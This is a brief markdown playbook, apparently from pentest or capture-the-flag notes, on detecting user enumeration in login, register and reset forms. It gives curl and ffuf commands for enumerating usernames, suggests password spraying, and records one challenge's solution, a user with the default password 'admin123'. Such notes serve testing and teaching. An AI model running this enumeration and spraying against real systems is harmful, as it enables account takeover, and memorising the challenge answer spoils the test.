# User enumeration (CWE-204)

**Signs**: login/register/reset responds differently for unknown user vs. wrong password —
message, status, size, redirect, or **timing**. Hint "wrong name gets a no".

## 1. Compare two requests
```bash
curl -s -d 'emp_id=nosuchuser&password=x' $T/login | grep -iE 'error|invalid|no such|incorrect'
curl -s -d 'emp_id=admin&password=x'      $T/login | grep -iE 'error|invalid|no such|incorrect'
```
Also compare `-w '%{http_code} %{size_download} %{time_total}'`.

## 2. Build candidate usernames
- Public pages: team lists, authors, footer emails (`postmaster@`), "contact" pages, `/about`.
- Stated format: "first initial + last name, lowercase" → `Priya Natarajan` → `pnatarajan`.
  `python scripts/auth/username_gen.py "Priya Natarajan" "John Smith"` prints common formats.
- Generic: `wordlists/usernames/top-usernames-shortlist.txt`, `names.txt`.

## 3. Enumerate
```bash
ffuf -u $T/login -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'emp_id=FUZZ&password=x' -w users.txt -fr 'No such employee'
python scripts/auth/user_enum.py $T/login --user-field emp_id --pass-field password \
     -U users.txt --invalid-text 'No such employee'
```
Same idea on `/register` ("username taken") and `/forgot` ("email sent" vs "unknown").

## 4. Then
Valid users + one common/default password each (spraying) → [default-creds](default-creds.md) /
[brute-force](brute-force.md).

Seen in: `auth10` (PeopleFirst HR: "No such employee ID." vs "Incorrect password." → `pnatarajan`
with onboarding default `admin123`).
